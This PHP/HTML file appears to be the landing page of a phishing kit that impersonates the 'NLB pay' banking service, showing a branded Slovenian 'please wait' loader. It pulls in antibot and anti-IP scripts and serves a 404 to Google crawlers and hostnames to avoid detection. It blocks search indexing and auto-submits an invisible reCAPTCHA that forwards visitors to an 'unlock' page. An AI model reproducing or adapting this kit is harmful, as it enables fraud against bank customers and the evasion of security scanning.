<?php
    include('includes/antibot1.php');
    include('includes/antibot2.php');
    include('includes/antiip.php');
    include('config.php');

    if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
    if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>NLB pay</title>
    <meta name="multilanguage" content="true">
    <meta name="lng" content="el">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="assets/img/favicon.ico">
    <link href="assets/css/loading.css" rel="stylesheet">
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <script>Window.onload = setTimeout(function(){grecaptcha.execute()},2000)</script>
    <script>
        function onSubmit(token) {
            document.getElementById("i-recaptcha").submit();
        }
    </script>
</head>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2500)</script>
<body>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    function post_captcha($user_response) {
        $fields_string = '';
        $fields = array(
            'secret' => $captch_secretkey,
            'response' => $user_response
        );
        foreach($fields as $key=>$value)
        $fields_string .= $key . '=' . $value . '&';
        $fields_string = rtrim($fields_string, '&');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);
        $result = curl_exec($ch);
        curl_close($ch);
        return json_decode($result, true);
    }
    $res = post_captcha($_POST['g-recaptcha-response']);
    if (!$res['success']) {
        echo 'reCAPTCHA error';
    } else {
        echo '<br><p>CAPTCHA was completed successfully!</p><br>';
    }
} else { 
}
?>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2000)</script>
<form id='i-recaptcha' action="includes/unlock.php" method="post">
<button hidden="hidden" class="g-recaptcha" <?php echo"data-sitekey="."'".$captch_key."'" ?> data-callback="onSubmit">
</button>
</form>
    <index-page>
         <div class="loader">
            <div class="loading-stage-container">
               <div class="flex-all-center">
                  <div class="loading-stage-logo-container">
                     <figure class="margin-0">
                        <img class="loading-stage-logo" src="assets/img/logo-sprite-2017.png" alt="">
                     </figure>
                  </div>
               </div>
               <spinner>
                  <div class="flex-column-all-center">
                     <div class="circle-loader"></div>
                     <h5 class="loader-text">Prosim počakaj</h5>
                  </div>
               </spinner>
            </div>
         </div>
      </index-page>
</body>
</html>
<?php
?>

